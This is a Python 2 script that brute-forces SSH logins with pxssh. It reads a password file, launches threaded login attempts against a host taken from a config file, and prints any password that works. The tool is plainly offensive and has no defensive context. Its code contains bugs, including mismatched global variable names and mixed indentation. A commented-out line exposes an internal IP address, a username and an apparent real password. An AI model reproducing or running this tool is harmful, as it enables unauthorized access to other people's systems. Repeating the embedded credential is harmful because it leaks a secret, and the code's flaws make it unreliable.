import pxssh
import time
from threading import *
import sys
import Connector
maxconn = 2

connection_lock = BoundedSemaphore (value=maxconn)

found = False
fails = 0


def send_command(s, cmd):
	s.sendline(cmd)
	s.prompt()
	print s.before


def connect(host, user, password,release):
  global Found
  global Fails 
  try:
      s=pxssh.pxssh()
      s.login(host, user, password,release)
      print '[+] Password found : '+ password
      found = True

  except Exception, e:
     if 'read_nonblocking' in str(e):
       Fails += 1
       time.sleep(5)
       connect(host, user, password, False)
     elif 'synchronize with original prompt' in str(e):
       time.sleep(1)
       connect(host, user, password, False) 
  finally:

	if release: 
		connection_lock.release()

host,user,passwdFile=Connector.connect('ConnectorA12.ini')

fn =open(passwdFile, 'r')
for line in fn.readlines():
  if found:
	print "[*] exit : password found"
  	exit(0)
  if fails>5:
	print "[!] exit : too many socket Timeouts"
	exit(0)
  connection_lock.acquire()
  password = line.strip('\r').strip('\n')
  print "[>] Testing : "+str(password)
  t = Thread(target=connect, args=(host,user,password,True))
  child = t.start()

	
#s=connect('192.168.0.114', 'cds4', 'EP321*+sAV5!$%cds2300^')
#send_command(s, 'ls')
